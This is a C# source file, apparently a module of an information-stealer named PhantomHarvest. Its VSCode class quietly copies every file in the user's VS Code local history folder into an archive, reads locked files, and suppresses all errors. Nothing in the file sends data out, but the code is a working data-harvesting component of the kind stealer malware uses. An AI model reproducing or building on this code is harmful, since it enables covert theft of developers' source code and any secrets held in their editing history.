using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Softwares
{
	internal class VSCode
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
				if (Directory.Exists(text))
				{
					string[] files = Directory.GetFiles(text, "*", SearchOption.AllDirectories);
					foreach (string file in files)
					{
						try
						{
							byte[] fileBytes = LockedFile.ReadLockedFile(file);
							if (fileBytes != null)
							{
								string relativePath = file.Substring(text.Length).TrimStart('\\', '/');
								using (MemoryStream ms = new MemoryStream(fileBytes))
								{
									zip.AddStream(ArchiveManager.Compression.Deflate, VSCode.SoftwareName + "/" + relativePath, ms, DateTime.Now, "");
								}
							}
						}
						catch {}
					}
				}
			}
			catch
			{
			}
		}

		public static string SoftwareName = "VSCode";
	}
}
